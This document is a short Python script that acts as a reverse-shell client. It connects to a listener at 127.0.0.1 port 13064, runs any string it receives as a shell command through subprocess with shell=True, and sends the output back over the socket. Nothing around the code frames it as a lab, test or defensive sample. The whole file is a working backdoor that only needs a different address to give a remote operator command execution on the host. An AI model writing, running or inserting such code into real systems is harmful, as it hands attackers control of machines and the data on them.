import socket
import subprocess

IP = "127.0.0.1"
PORT = 13064

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((IP, PORT))
    print(f"Connected to {IP}:{PORT}")

    while True:
        data = sock.recv(1024).decode()

        if data == "name":
            sock.send(socket.gethostname().encode())
        elif data == "exit":
            sock.close()
            exit(0)
        else:
            try:
                # Run the command received
                result = subprocess.run(data, shell=True, capture_output=True, text=True)

                # If there's output, send it back to the server
                if result.stdout:
                    sock.send(result.stdout.encode())
                elif result.stderr:
                    sock.send(result.stderr.encode())
                else:
                    # No output was produced
                    sock.send("Command executed, no output.".encode())
            except Exception as e:
                sock.send(f"Error executing command: {str(e)}".encode())

except KeyboardInterrupt:
    print("\nClosing socket.")
    sock.close()
    exit(0)
